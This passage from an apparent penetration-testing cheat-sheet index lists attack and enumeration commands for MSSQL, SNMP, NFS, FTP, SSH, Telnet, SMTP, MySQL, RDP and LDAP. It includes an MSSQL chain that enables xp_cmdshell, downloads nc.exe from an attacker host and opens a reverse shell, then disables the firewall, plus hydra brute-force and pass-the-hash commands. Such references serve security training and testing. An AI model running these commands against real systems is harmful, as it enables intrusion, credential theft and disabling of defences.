designed to handle a wide range of data processing tasks within corporate environments. MSSQL uses SQL (Structured Query Language) to manage databases and process queries.</p>"},{"location":"Offensive-Security/Network/ports/1433/#mssql-enumeration","title":"MSSQL Enumeration","text":"<ol> <li>Login using Windows authentication: <code>python3 mssqlclient.py [USERNAME]@[IP-ADDRESS] -windows-auth</code></li> <li>Login without Windows authentication: <code>python3 mssqlclient.py [DOMAIN]/[USERNAME]@[IP-ADDRESS]</code></li> <li> <p>List SQL user accounts and their status:      <pre><code>select sp.name as login, sp.type_desc as login_type, sl.password_hash, sp.create_date, sp.modify_date, case when sp.is_disabled = 1 then 'Disabled' else 'Enabled' end as status from sys.server_principals sp left join sys.sql_logins sl on sp.principal_id = sl.principal_id where sp.type not in ('G', 'R') order by sp.name;\n</code></pre></p> </li> <li> <p>Show all databases: <code>SELECT name FROM master.dbo.sysdatabases</code> </p> NOTE <p>Default databases include <code>master</code>, <code>tempdb</code>, <code>model</code>, and <code>msdb</code>.</p> </li> <li> <p>Switch to specific database: <code>use [DATABASE-NAME];</code></p> </li> <li>Bypass \"access denied\" error (OPTIONAL): <code>ERROR: Line 1: The server principal \"MAXIM\\hackfast\" is not able to access the database \"[DATABASE-NAME]\" under the current security context.</code></li> <li>Find users with impersonation privileges (OPTIONAL): <code>SELECT distinct b.name FROM sys.server_permissions a INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = 'IMPERSONATE'</code></li> <li>Impersonate another login (OPTIONAL): <code>EXECUTE AS LOGIN = '[LOGIN-NAME]'</code></li> <li>Switch to specific database: <code>use [DATABASE-NAME]</code></li> <li>List all tables in the database: <code>SELECT * FROM [DATABASE-NAME].INFORMATION_SCHEMA.TABLES;</code></li> <li>Query a specific table: <code>select * from [TABLE-NAME];</code></li> </ol>"},{"location":"Offensive-Security/Network/ports/1433/#access-and-reverse-shell-techniques","title":"Access and Reverse Shell Techniques","text":"<ol> <li>Login to MSSQL using Windows authentication: <code>python3 mssqlclient.py [USERNAME]@[IP-ADDRESS] -windows-auth</code></li> <li>Login to MSSQL without Windows authentication: <code>python3 mssqlclient.py [DOMAIN]/[USERNAME]@[IP-ADDRESS]</code></li> <li>Check if xp_cmdshell is enabled: <code>SELECT * FROM sys.configurations WHERE name = 'xp_cmdshell';</code></li> <li>Enable advanced options to allow setup for xp_cmdshell: <code>EXEC sp_configure 'show advanced options', 1; RECONFIGURE;</code></li> <li>Enable xp_cmdshell to allow SQL Server to execute command-line operations: <code>EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;</code></li> <li>Set up the HTTP server to host nc.exe, create a C:\\temp folder on the target, transfer nc.exe, and execute it for a reverse shell: <code>xp_cmdshell 'mkdir C:\\temp'</code>,<code>go</code></li> <li>Download nc.exe to the Target Machine: <code>xp_cmdshell 'certutil -split -urlcache -f http://[IP-ADRESS]/nc.exe C:\\temp\\nc.exe'</code>,<code>go</code></li> <li>Confirm that nc.exe has been placed on the target system: <code>xp_cmdshell 'dir C:\\temp'</code>,<code>go</code></li> <li>Execute nc.exe to establish a reverse shell to the attacker's machine: <code>xp_cmdshell 'C:\\temp\\nc.exe [IP-ADRESS] 443 -e cmd.exe'</code> ,<code>go</code></li> <li>Bypass blacklisted xp_cmdshell: <code>'; DECLARE @x AS VARCHAR(100)='xp_cmdshell'; EXEC @x 'ping [IP-ADRESS]' \u2014</code></li> <li>Disable the Windows Firewall to reduce defenses against external attacks: <code>xp_cmdshell 'netsh firewall set opmode disable';</code></li> <li>Modify the registry to enable Remote Desktop, allowing remote access to the system: <code>xp_cmdshell 'reg add \"HKEY_LOCAL_MACHINE\\\\System\\\\CurrentControlSet\\\\Control\\\\Terminal Server\" /v fDenyTSConnections /t REG_DWORD /d 0 /f';</code></li> </ol>"},{"location":"Offensive-Security/Network/ports/161/","title":"161/162/199 - SNMP","text":""},{"location":"Offensive-Security/Network/ports/161/#introduction","title":"Introduction","text":"<p>SNMP (Simple Network Management Protocol) is a protocol used to manage and monitor devices on IP networks. It operates on a manager-agent model, where the manager queries agents on network devices like routers and switches to gather their operational status. SNMP supports versions SNMPv1, SNMPv2, and SNMPv3, with SNMPv3 offering enhanced security through authentication and encryption.</p>"},{"location":"Offensive-Security/Network/ports/161/#snmp-enumeration-exploitation","title":"SNMP enumeration &amp; exploitation","text":"Command Description <code>onesixtyone -c community.txt -i [PATH-TO-IPS]</code> Scans multiple IPs using a list of common SNMP community strings. <code>snmpwalk -c [COMMUNITY-STRING] -v1 [TARGET-IP]</code> Recursively queries SNMP MIBs to enumerate system details (SNMP v1). <code>snmp-check [TARGET-IP]</code> Performs detailed enumeration of SNMP services using default or specified strings. <code>snmpcheck -c [COMMUNITY-STRING] -t [TARGET-IP]</code> Retrieves SNMP device info using targeted community strings. <code>msf&gt; use auxiliary/scanner/snmp/snmp_enum</code> Metasploit module for enumerating SNMP info such as system, network, and service data."},{"location":"Offensive-Security/Network/ports/161/#nmap-snmp-script-enumeration","title":"Nmap SNMP script enumeration","text":"<p>Use the Nmap scripting engine (NSE) to probe SNMP services for data and vulnerabilities:</p> Nmap Script Description <code>snmp-brute.nse</code> Brute-forces SNMP community strings. <code>snmp-info.nse</code> Retrieves general system information. <code>snmp-interfaces.nse</code> Lists available network interfaces on the device. <code>snmp-netstat.nse</code> Displays open network connections and stats. <code>snmp-processes.nse</code> Shows a list of running processes. <code>snmp-sysdescr.nse</code> Retrieves the system description banner. Usage <code>nmap [TARGET-IP] -Pn -sU -p 161 --script=[SCRIPT_NAME]</code>"},{"location":"Offensive-Security/Network/ports/161/#brute-force-snmp-credentials","title":"Brute-force SNMP credentials","text":"<p>Use following tools and methods to discover valid community strings:</p> Command Description <code>onesixtyone -c /path/to/wordlist.txt [TARGET-IP]</code> Fast SNMP community string brute-forcing tool. <code>hydra -P /path/to/wordlist.txt [TARGET-IP] snmp</code> Uses Hydra to brute-force SNMP community strings. <code>nmap -p 161 --script snmp-brute --script-args snmp-brute.communitiesdb=/path/to/community.lst [TARGET-IP]</code> Brute-forces SNMP community strings using Nmap and a custom list."},{"location":"Offensive-Security/Network/ports/2049/","title":"2049 - NFS","text":""},{"location":"Offensive-Security/Network/ports/2049/#introduction","title":"Introduction","text":"<p>NFS (Network File System) is a protocol that allows users to access files over a network as if they were local. Developed by Sun Microsystems, it operates on a client-server model where the server manages files and clients access them remotely. NFS is known for its simplicity and efficiency due to its stateless nature, which reduces server load. It is widely used in UNIX/Linux systems and supports cross-platform.</p>"},{"location":"Offensive-Security/Network/ports/2049/#nfs-server-enumeration","title":"Nfs server enumeration","text":"Method Tool / Command Description Shodan Search <code>port:2049</code> Identify NFS services exposed on the internet, which can be potential targets for further investigation. NFS Service Detection <code>nmap -n -PN -sS -T5 -p 2049 --script=nfs-showmount [IP-ADDRESS/RANGE]</code> Basic NFS detection to find NFS servers in a specified subnet. NFS Scanning <code>nmap --script=nfs-ls.nse,nfs-showmount.nse,nfs-statfs.nse -p 2049 [IP-ADDRESS]</code> Perform a detailed scan to enumerate files, mount points, and system statistics of NFS servers. Metasploit NFS Detection Use Metasploit <code>auxiliary/scanner/nfs/nfsmount</code> Scans for NFS mounts in a network range to identify exposed network shares that could pose security risks. Listing NFS Exports <code>showmount -e [IP-ADDRESS]</code> Display all exported directories available on a specified NFS server."},{"location":"Offensive-Security/Network/ports/2049/#misconfiguration-exploitation","title":"Misconfiguration Exploitation","text":"Misconfiguration Type Potential Risk Mitigation Strategy no_root_squash Gives root user on the client the ability to access files on the NFS server as root. Avoid using <code>no_root_squash</code> in <code>/etc/exports</code>. Configure <code>root_squash</code> to prevent root access escalations. no_all_squash Applies to non-root users, allowing escalated privileges if exploited. Ensure that <code>no_all_squash</code> is not used carelessly. Regularly audit the NFS server configurations and access controls."},{"location":"Offensive-Security/Network/ports/2049/#mount-share","title":"Mount Share","text":"<ol> <li> <p>Enumerating RPC Services <code>rpcinfo -p [IP-ADDRESS]</code> <pre><code> program vers proto   port  service\n 100000    4   tcp    111  portmapper\n 100000    3   tcp    111  portmapper\n 100000    2   tcp    111  portmapper\n 100000    4   udp    111  portmapper\n 100000    3   udp    111  portmapper\n 100000    2   udp    111  portmapper\n 100024    1   udp  50077  status\n 100024    1   tcp  52743  status\n 100003    2   tcp   2049  nfs\n 100003    3   tcp   2049  nfs\n 100003    4   tcp   2049  nfs\n 100227    2   tcp   2049  nfs\n 100227    3   tcp   2049  nfs\n 100003    2   udp   2049  nfs\n 100003    3   udp   2049  nfs\n 100003    4   udp   2049  nfs\n 100227    2   udp   2049  nfs\n 100227    3   udp   2049  nfs\n 100021    1   udp  48499  nlockmgr\n 100021    3   udp  48499  nlockmgr\n 100021    4   udp  48499  nlockmgr\n 100021    1   tcp  58575  nlockmgr\n 100021    3   tcp  58575  nlockmgr\n 100021    4   tcp  58575  nlockmgr\n 100005    1   udp  37112  mountd\n 100005    1   tcp  42112  mountd\n 100005    2   udp  41168  mountd\n 100005    2   tcp  41883  mountd\n 100005    3   udp  40812  mountd\n 100005    3   tcp  55871  mountd\n</code></pre> </p> </li> <li> <p>Running NSE Scripts to Enumerate RPC Services <code>nmap -sV --script=nfs-* [IP-ADDRESS]</code> </p> <p></p> </li> <li> <p>Enumerate shares With showmount command <code>showmount -e [IP-ADDRESS]</code> </p> </li> <li> <p>Create a Directory for Mounting the Share <code>mkdir /tmp/nfs</code></p> </li> <li> <p>Mount the NFS Share to the New Directory <code>sudo mount -t nfs [IP-ADDRESS]:/home/share /tmp/nfs -nolock</code></p> </li> <li> <p>Navigate to the mounted directory to access the NFS share: <code>cd /tmp/nfs</code></p> </li> </ol>"},{"location":"Offensive-Security/Network/ports/21/","title":"21 - FTP","text":""},{"location":"Offensive-Security/Network/ports/21/#introduction","title":"Introduction","text":"<p>FTP (File Transfer Protocol) is a network protocol used to transfer files between a client and a server over a TCP network. It supports file uploads, downloads, and directory management, using separate control and data channels for commands and file data. FTP can allow anonymous or authenticated access with a username and password.</p>"},{"location":"Offensive-Security/Network/ports/21/#downloading-files","title":"Downloading Files","text":"<p>Overview of commands for downloading files from an FTP server using various tools.</p> Command Description <code>wget -r ftp://[USERNAME]:@[TARGET-IP]</code> downloads all files from the FTP server, useful for complete directory downloads. <code>wget -m --no-passive ftp://[USERNAME]:[PASSWORD]@[TARGET-IP]</code> Mirrors the entire FTP site, downloading all available files and directories, preserving the server structure. <code>ftp [TARGET-IP]</code> then <code>binary</code> and <code>get [FILE-NAME]</code> Connects to an FTP server, switches to binary mode for data integrity, and downloads a specified file. <code>curl -O ftp://[USERNAME]:[PASSWORD]@[TARGET-IP]/PATH/TO/FILE_OR_DIR</code> Downloads a specific file or directory from the FTP server, using curl for precise retrieval. Tips &amp; Tricks <p>Check if <code>anonymous:anonymous</code> FTP is enabled.</p>"},{"location":"Offensive-Security/Network/ports/21/#transferring-files","title":"Transferring Files","text":"<p>Commands for setting up an FTP server and uploading files.</p> Command Description <code>python3 -m pyftpdlib -p 21</code> Starts an FTP server on port 21 using Python pyftpdlib, convenient for quick setups on local networks. <code>ftp [TARGET-IP]</code> then <code>binary</code> and <code>put [FILE-TO-UPLOAD]</code> Connects to an FTP server and uploads a file after switching to binary mode to preserve file integrity."},{"location":"Offensive-Security/Network/ports/21/#brute-forcing-ftp-credentials","title":"Brute-Forcing FTP Credentials","text":"Scenario Command Unknown User <code>hydra -L user.txt -p \"Password\" -f [TARGET-IP] ftp</code> Unknown Password <code>hydra -l user -P /opt/rockyou.txt -f [TARGET-IP] ftp</code> Unknown User and Password <code>hydra -L user.txt -P /opt/rockyou.txt -f [TARGET-IP] ftp</code> Different Port <code>hydra -l user -P /opt/rockyou.txt -f [TARGET-IP] ftp -s 9999</code>"},{"location":"Offensive-Security/Network/ports/21/#nmap-nse-scripts","title":"Nmap Nse Scripts","text":"<p>Nmap NSE scripts specifically designed for FTP to discover vulnerabilities or gather information.</p> Command Description <code>ls /usr/share/nmap/scripts/ \\| grep \"ftp\"</code> Lists available Nmap scripts that are specifically related to FTP, aiding in targeted vulnerability scanning. <code>nmap -p 21 --script ftp* [TARGET-IP]</code> Executes FTP-related Nmap scripts against a target IP on port 21 for comprehensive vulnerability scanning and information gathering."},{"location":"Offensive-Security/Network/ports/22/","title":"22 - SSH","text":""},{"location":"Offensive-Security/Network/ports/22/#introduction","title":"Introduction","text":"<p>SSH (Secure Shell) is a protocol for secure remote access and file transfer between systems. It encrypts all communications, protecting against eavesdropping and attacks. SSH uses a client-server model and supports both password and key-based authentication.</p>"},{"location":"Offensive-Security/Network/ports/22/#ssh-connection-management","title":"SSH Connection Management","text":"<p>Use the following commands to establish SSH connections.</p> Connection Type Command Description Password Auth <code>ssh -p 22 [USERNAME]@[TARGET-IP]</code> Connects to an SSH server using password. Private Key Auth <code>chmod 600 PATH/TO/PRIVATE-KEY</code> then <code>ssh -i PATH/TO/PRIVATE/KEY [USERNAME]@[TARGET-IP]</code> Sets the correct permissions for a private key and uses it to establish an SSH connection."},{"location":"Offensive-Security/Network/ports/22/#brute-forcing-ssh-credentials","title":"Brute-Forcing SSH Credentials","text":"<p>Hydra can be used to brute-force SSH logins under different scenarios:</p> Scenario Command Unknown User <code>hydra -L user.txt -p \"Password\" -f [TARGET-IP] ssh</code> Unknown Password <code>hydra -l user -P /opt/rockyou.txt -f [TARGET-IP] ssh</code> Unknown User and Password <code>hydra -L user.txt -P /opt/rockyou.txt -f [TARGET-IP] ssh</code> Different Port <code>hydra -l user -P /opt/rockyou.txt -f [TARGET-IP] ssh -s 9999</code>"},{"location":"Offensive-Security/Network/ports/22/#bypassing-ssh-restrictions","title":"Bypassing SSH Restrictions","text":"<p>Useful techniques for executing commands or scripts over SSH:</p> Scenario Command Escaping to Another Shell <code>sshpass -p '[PASSWORD]' ssh [USERNAME]@[TARGET-IP] -t bash</code> Remote Command Execution <code>ssh [USERNAME]@[TARGET-IP] 'echo \"[COMMAND-HERE]\"'</code> Execute Local Script Remotely <code>ssh [USERNAME]@[TARGET-IP] 'bash -s' &lt; /path/to/local_script.sh</code>"},{"location":"Offensive-Security/Network/ports/22/#nmap-nse-scripts-for-ssh","title":"Nmap NSE Scripts for SSH","text":"<p>Nmap NSE scripts specifically designed for SSH to discover vulnerabilities or gather information.</p> Task Command Description Discovering SSH-related Scripts <code>ls /usr/share/nmap/scripts/ \\| grep \"ssh\"</code> Lists all Nmap NSE scripts related to SSH. This helps in selecting the appropriate scripts for targeted SSH testing. Run SSH NSE Scripts <code>nmap -p 22 --script ssh* [TARGET-IP]</code> Executes SSH-related Nmap scripts against a target IP on port 22 for comprehensive vulnerability scanning and information gathering."},{"location":"Offensive-Security/Network/ports/23/","title":"23 - Telnet","text":""},{"location":"Offensive-Security/Network/ports/23/#introduction","title":"Introduction","text":"<p>Telnet is a protocol used for remote text-based communication over a network. While it provides terminal access similar to SSH, Telnet transmits data in plaintext, making it inherently insecure and prone to interception.</p>"},{"location":"Offensive-Security/Network/ports/23/#telnet-enumeration-techniques","title":"Telnet Enumeration Techniques","text":"<p>Use following commands to discover and inspect Telnet services:</p> Command Description <code>telnet [IP-ADDRESS] [PORT]</code> Starts a Telnet session for banner grabbing and initial reconnaissance. <code>nmap -p 23 [TARGET-IP]</code> Checks if the default Telnet port (23) is open. <code>nmap -n -sV -Pn --script \"*telnet*\" -p 23 [TARGET-IP]</code> Detects service version and runs Telnet-specific NSE scripts for deeper analysis."},{"location":"Offensive-Security/Network/ports/23/#brute-forcing-telnet-credentials","title":"Brute-Forcing Telnet Credentials","text":"<p>Hydra can be used to test credentials under various scenarios:</p> Scenario Command Unknown User <code>hydra -L user.txt -p \"Password\" -f [TARGET-IP] telnet</code> Unknown Password <code>hydra -l user -P /opt/rockyou.txt -f [TARGET-IP] telnet</code> Unknown User and Password <code>hydra -L user.txt -P /opt/rockyou.txt -f [TARGET-IP] telnet</code> Different Port <code>hydra -l user -P /opt/rockyou.txt -f [TARGET-IP] telnet -s 9999</code>"},{"location":"Offensive-Security/Network/ports/23/#automating-exploitation-with-metasploit","title":"Automating Exploitation with Metasploit","text":"<p>Metasploit offers modules for both scanning and exploiting Telnet services:</p> Command Description <code>msfconsole, search telnet, use exploit/[MODULE-PATH], set RHOSTS [TARGET-IP], run</code> Runs a Telnet exploit module from Metasploit\u2019s library. <code>msfconsole, use auxiliary/scanner/telnet/telnet_version, set RHOSTS [TARGET-IP], run</code> Identifies Telnet service version and potential vulnerabilities."},{"location":"Offensive-Security/Network/ports/23/#key-configuration-files","title":"Key Configuration Files","text":"<p>These files control how Telnet operates on a system:</p> File Path Description <code>/etc/inetd.conf</code> Configuration file for services controlled by <code>inetd</code>, including Telnet. <code>/etc/xinetd.d/telnet</code> Telnet-specific config for systems using <code>xinetd</code> as the service manager. <code>/etc/xinetd.d/stelnet</code> Configuration for \"secure Telnet\" (stelnet), if present. Used for encrypted connections."},{"location":"Offensive-Security/Network/ports/25/","title":"25 - SMTP","text":""},{"location":"Offensive-Security/Network/ports/25/#introduction","title":"Introduction","text":"<p>SMTP (Simple Mail Transfer Protocol) is a protocol used to send emails between servers. It typically runs on ports 25 and 587. While SMTP handles message delivery, it does not encrypt data by default, which can expose sensitive information unless combined with TLS/SSL.</p>"},{"location":"Offensive-Security/Network/ports/25/#nmap-nse-scripts-for-smtp","title":"Nmap NSE Scripts for SMTP","text":"<p>Use Nmap scripting engine to discover misconfigurations, test for vulnerabilities, and enumerate SMTP features:</p> Command Description <code>ls -la /usr/share/nmap/scripts \\| grep \"smtp\"</code> Lists all available NSE scripts related to SMTP. <code>nmap -p 25 --script smtp-open-relay [TARGET-IP]</code> Checks if SMTP server is an open relay, which could be abused to send spam emails. <code>nmap -p 25 --script smtp-enum-users --script-args smtp-enum-users.methods={VRFY} [TARGET-IP]</code> Enumerates users on an SMTP server using the VRFY command to gather potential email targets. <code>nmap -p 25 --script=+smtp* -oN smtp_scan_results.txt [TARGET-IP]</code> Performs a detailed scan of SMTP-related services and saves the results to a file."},{"location":"Offensive-Security/Network/ports/25/#manual-open-relay-test","title":"Manual Open Relay Test","text":"<pre><code>sequenceDiagram\n    participant Attacker\n    participant SMTP\n    Attacker-&gt;&gt;SMTP: telnet [IP_ADDRESS] 25\n    Note over Attacker,SMTP: Connection to SMTP server initiated.\n    Attacker-&gt;&gt;SMTP: HELO example.com\n    Note over Attacker,SMTP: Greet the server from example.com.\n    Attacker-&gt;&gt;SMTP: MAIL FROM:&lt;attacker@example.com&gt;\n    Note over Attacker,SMTP: Specify the sender's email.\n    Attacker-&gt;&gt;SMTP: RCPT TO:&lt;target@example.com&gt;\n    Note over Attacker,SMTP: Specify the recipient's email.\n    Attacker-&gt;&gt;SMTP: DATA\n    Note over Attacker,SMTP: Begin writing the message body.\n    Attacker-&gt;&gt;SMTP: Subject: Open Relay Test Message\n    Attacker-&gt;&gt;SMTP: This is a test email to verify open relay vulnerability.\n    Attacker-&gt;&gt;SMTP: .\n    Note over Attacker,SMTP: End the message body.\n    Attacker-&gt;&gt;SMTP: QUIT\n    Note over Attacker,SMTP: End the session and send the email.</code></pre>"},{"location":"Offensive-Security/Network/ports/3306/","title":"3306 - MYSQL","text":""},{"location":"Offensive-Security/Network/ports/3306/#introduction","title":"Introduction","text":"<p>MySQL is an open-source relational database management system (RDBMS) that uses SQL (Structured Query Language) for managing data. Owned by Oracle Corporation, it's widely used for web applications due to its reliability, scalability, and flexibility. MySQL operates on a client-server model and supports various storage engines to cater to different performance and transactional needs.</p>"},{"location":"Offensive-Security/Network/ports/3306/#local-mysql-access-scenarios","title":"Local MySQL Access Scenarios","text":"Scenario Command No password <code>mysql -u [USERNAME]</code> With Password <code>mysql -u [USERNAME] -p</code> Specify database name <code>mysql -u [USERNAME] -p database_name</code> Execute commands <code>mysql -u [USERNAME] -p database_name -e \"show databases;\"</code> Execute commands via a file <code>echo 'show tables;' &gt; example.sql</code> <code>mysql -u [USERNAME] --password='password' database_name -v &lt; example.sql</code> Read arbitrary files <code>mysql -u [USERNAME] --password='password' database_name -v &lt; /etc/passwd</code>"},{"location":"Offensive-Security/Network/ports/3306/#remote-mysql-access-scenarios","title":"Remote MySQL Access Scenarios","text":"Scenario Command With Password <code>mysql -u [USERNAME] -p -h [TARGET-IP] -P 3306</code> Without password (remove -p) <code>mysql -u [USERNAME] -h [TARGET-IP] -P 3306</code> Specify database (-D) <code>mysql -u [USERNAME] -p -h [TARGET-IP] -D database_name</code> Default credential (username: root, no password) <code>mysql -u root -h [TARGET-IP] -P 3306</code>"},{"location":"Offensive-Security/Network/ports/3306/#brute-forcing-mysql-credentials","title":"Brute-Forcing MySQL Credentials","text":"Scenario Command Unknown User <code>hydra -L user.txt -p \"Password\" -f [TARGET-IP] mysql</code> Unknown Password <code>hydra -l user -P /opt/rockyou.txt -f [TARGET-IP] mysql</code> Unknown User and Password <code>hydra -L user.txt -P /opt/rockyou.txt -f [TARGET-IP] mysql</code> Different Port <code>hydra -l user -P /opt/rockyou.txt -f [TARGET-IP] mysql -s 9999</code>"},{"location":"Offensive-Security/Network/ports/3306/#mysql-enumeration-and-management-commands","title":"MySQL Enumeration and Management Commands","text":"Action Command List MySQL users <code>select user from mysql.user;</code> List privileges of each user <code>select user,select_priv,insert_priv,update_priv,delete_priv,create_priv from mysql.user;</code> Display databases <code>show databases;</code> Switch to the database <code>use db_name;</code> Display tables in the current database <code>show tables;</code> Display tables and table type <code>show full tables;</code> Display tables in the database <code>show tables from [DATABASE];</code> Display tables which names start with 'user' <code>show tables like 'user%';</code> Display tables which names start with 'user' in the database <code>show tables from [DATABASE] like 'user%';</code> Display columns in a given table <code>show columns from [TABLE];</code> Display everything in the table <code>select * from [TABLE];</code> Create new table <code>create table table_name(column_name column_type);</code> <code>create table table_name(user_id int, user_name varchar(40));</code> Create a user-defined function <code>create function func_name(param1, param2) returns datatype;</code> <code>create function new_fund(age integer) returns integer;</code> Use a function <code>select func_name(param1, param2);</code> Insert new record to a given table <code>insert into [TABLE] values(value1, value2);</code> Update data in a given table <code>update [TABLE] set [COLUMN]='[VALUE]';</code> <code>update [TABLE] set [COLUMN1]='[VALUE1]',[COLUMN2]='[VALUE2]';</code> Delete a record <code>delete from [TABLE] where [COLUMN] = [VALUE];</code>"},{"location":"Offensive-Security/Network/ports/3306/#mysql-command-line-enumeration","title":"MySQL Command Line Enumeration","text":"<pre><code># Lists all databases on the MySQL server.  \nSHOW DATABASES;\n# Switches to a specific database.  \nUSE database_name;\n# Displays all tables in the current database.  \nSHOW TABLES;\n# Lists all columns in a specific table.    \nSHOW COLUMNS FROM table_name;\n# Retrieves data from a table.  \nSELECT * FROM table_name;\n</code></pre>"},{"location":"Offensive-Security/Network/ports/3389/","title":"3389 - RDP","text":""},{"location":"Offensive-Security/Network/ports/3389/#introduction","title":"Introduction","text":"<p>RDP (Remote Desktop Protocol) is a Microsoft-developed protocol that allows users to connect and interact with another computer remotely. It provides a graphical interface, transmitting the user's display and inputs securely over a network. RDP is commonly used for remote computer management, IT support, and accessing work applications from afar. It's primarily used with Windows but is available for other operating systems as well.</p>"},{"location":"Offensive-Security/Network/ports/3389/#rdp-access-and-authentication-commands","title":"RDP Access and Authentication Commands","text":"Command Description <code>rdesktop -u [USERNAME] -p [PASSWORD] [TARGET-IP]</code> Starts a basic RDP connection, enabling desktop access with login credentials. <code>xfreerdp /v:[TARGET-IP] /u:'USERNAME' /p:'PASSWORD' /drive:[NAME],[PATH]</code> Establishes an RDP session with resource redirection, allowing local drives to be accessible during the remote session. Useful for transferring files between the host and the client. <code>xfreerdp /u:'USERNAME' /d:[DOMAIN] /pth:[NTLM] /v:[SERVER].[DOMAIN].local</code> Connects to an RDP session using Pass-the-Hash authentication. This method uses NTLM hashes instead of plain text passwords. Tips &amp; tricks <p>You can log into the RDP server without a password to gather information, such as the Windows version, from the login page.</p>"},{"location":"Offensive-Security/Network/ports/3389/#freerdp-connection-scenarios","title":"FreeRDP Connection Scenarios","text":"Command Scenario <code>xfreerdp /u:[USERNAME] /p:[PASSWORD] /v:[TARGET-IP] /sound:sys:alsa</code> Connect to a FreeRDP server and activate audio output redirection using sys:alsa device <code>xfreerdp /v:[TARGET-IP] /u:[USERNAME] /p:[PASSWORD] /dynamic-resolution</code> Connect to a FreeRDP server with dynamic resolution <code>xfreerdp /v:[TARGET-IP] /u:[USERNAME] /p:[PASSWORD] +clipboard</code> Connect to a FreeRDP server with clipboard redirection <code>xfreerdp /v:[TARGET-IP] /u:[USERNAME] /p:[PASSWORD] /cert:ignore</code> Connect to a FreeRDP server ignoring any certificate checks <code>xfreerdp /v:[TARGET-IP] /u:[USERNAME] /p:[PASSWORD] /drive:path/to/directory,share_name</code> Connect to a FreeRDP server with a shared directory"},{"location":"Offensive-Security/Network/ports/3389/#brute-forcing-rdp-credentials","title":"Brute-Forcing RDP Credentials","text":"Scenario Command Unknown User <code>hydra -L user.txt -p \"Password\" -f rdp://[TARGET-IP]</code> Unknown Password <code>hydra -l user -P /opt/rockyou.txt -f rdp://[TARGET-IP]</code> Unknown User and Password <code>hydra -L user.txt -P /opt/rockyou.txt -f rdp://[TARGET-IP]</code>"},{"location":"Offensive-Security/Network/ports/3389/#nmap-nse-scripts","title":"Nmap NSE Scripts","text":"Command Description <code>ls -la /usr/share/nmap/scripts \\| grep \"rdp\"</code> Lists available Nmap scripts that target RDP services, ideal for identifying potential security enhancements or vulnerabilities. <code>nmap --script rdp-enum-encryption -p 3389 [IP_ADDRESS]</code> Enumerates encryption methods supported by the RDP server, providing insights into the security level of the RDP connections. <code>nmap --script rdp-vuln-ms12-020 -p 3389 [IP_ADDRESS]</code> Checks for the notorious MS12-020 vulnerability, which if present, could allow unauthorized remote code execution on the RDP server."},{"location":"Offensive-Security/Network/ports/389/","title":"389/636 - LDAP","text":""},{"location":"Offensive-Security/Network/ports/389/#introduction","title":"Introduction","text":"<p>LDAP (Lightweight Directory Access Protocol) is a protocol used to access and manage directory information over IP networks. It organizes user, group, and resource data in a hierarchical structure, typically for authentication, authorization, and centralized user management. LDAP is widely used in Active Directory and often integrated with applications for functions like login control and contact lookup.</p>"},{"location":"Offensive-Security/Network/ports/389/#ports","title":"Ports","text":"<pre><code>389     LDAP (unencrypted or STARTTLS)\n636     LDAPS (LDAP over SSL/TLS)\n</code></pre>"},{"location":"Offensive-Security/Network/ports/389/#ldap-commands","title":"LDAP commands","text":"<pre><code># Basic search with bind (replace placeholders accordingly)\nldapsearch -H ldap://[IP-ADDRESS] -D [USERNAME] -w [PASSWORD] -b \"DC=HACKFAST,DC=LOCAL\" &gt; data.txt\n\n# Query naming contexts and configuration\nldapsearch -x -H ldap://[IP-ADDRESS] -b \"\" -s base configContext namingContexts monitorContext\n\n# Search base domain with anonymous bind\nldapsearch -h [IP-ADDRESS] -x -b \"dc=[DOMAIN],dc=local\"\n\n# Search for people objects\nldapsearch -h [IP-ADDRESS] -x -b \"dc=[DOMAIN],dc=local\" '(objectClass=person)'\n\n# Search for user objects\nldapsearch -h [IP-ADDRESS] -x -b \"dc=[DOMAIN],dc=local\" '(objectClass=user)'\n\n# Search for group objects\nldapsearch -h [IP-ADDRESS] -x -b \"dc=[DOMAIN],dc=local\" '(objectClass=group)'\n</code></pre>"},{"location":"Offensive-Security/Network/ports/389/#anonymous-access-checks","title":"Anonymous access checks","text":"<pre><code># Anonymous bind to the base domain\nldapsearch -x -H ldap://[IP-ADDRESS] -D '' -w '' -b \"DC=[DOMAIN],DC=local\"\n\n# Alternate syntax for anonymous bind\nldapsearch -H ldap://[IP-ADDRESS]:389 -b \"dc=[DOMAIN],dc=local\" -x\n</code></pre>"},{"location":"Offensive-Security/Network/ports/389/#bypass-tls-sni-check-ldaps","title":"Bypass TLS SNI check (LDAPS)","text":"<pre><code>ldapsearch -H ldaps://[IP-ADDRESS]:636/ -x -s base -b '' \"(objectClass=*)\" \"*\" +\n</code></pre>"},{"location":"Offensive-Security/Network/ports/389/#validate-credentials","title":"Validate credentials","text":"<pre><code># Validate using DOMAIN\\USERNAME format\nldapsearch -x -H ldap://[IP-ADDRESS] -D '&lt;DOMAIN&gt;\\\\[USERNAME]' -w '[PASSWORD]' -b \"DC=[DOMAIN],DC=local\"\n\n# Validate using CN format\nldapsearch -H ldap://[IP-ADDRESS] -b \"dc=[DOMAIN],dc=local\" -D \"cn=[USERNAME],dc=[DOMAIN],dc=local\" -w [PASSWORD] -x\n\n# Validate using UPN format\nldapsearch -h [DOMAIN.LOCAL] -D '[USERNAME]@[DOMAIN].local' -w [PASSWORD] -b \"DC=[DOMAIN],DC=local\"\n</code></pre>"},{"location":"Offensive-Security/Network/ports/389/#processing-ldap-search-results","title":"Processing LDAP search results","text":"<pre><code># Count and sort unique entries in output\nawk '{print $1}' ldapsearch.txt | sort | uniq -c | sort -nr | grep ':'\n\n# Extract and save usernames\ngrep -i \"samaccountname\" ldapsearch.txt &gt; raw_users.txt\ncut -d: -f2 raw_users.txt | tr -d \" \" &gt; users.txt\n\n# Extract descriptions from user entries\ngrep -i \"description\" ldapsearch.txt\n</code></pre>"},{"location":"Offensive-Security/Network/ports/389/#context-discovery-and-general-enumeration","title":"Context discovery and general enumeration","text":"<pre><code># Get base naming contexts\nldapsearch -H ldap://[IP-ADDRESS] -x -s base -b \"\" -LLL -o ldif-wrap=no namingcontexts\n\n# General search within the naming context\nldapsearch -H ldap://[IP-ADDRESS] -x -b \"DC=[DOMAIN],DC=local\"\n</code></pre>"},{"location":"Offensive-Security/Network/ports/445/","title":"445 - SMB","text":""},{"location":"Offensive-Security/Network/ports/445/#introduction","title":"Introduction","text":"<p>Server Message Block (SMB) is a network file sharing protocol that provides access to shared files and printers on a local network. Older versions of SMB tend to be vulnerable to major exploits, such as 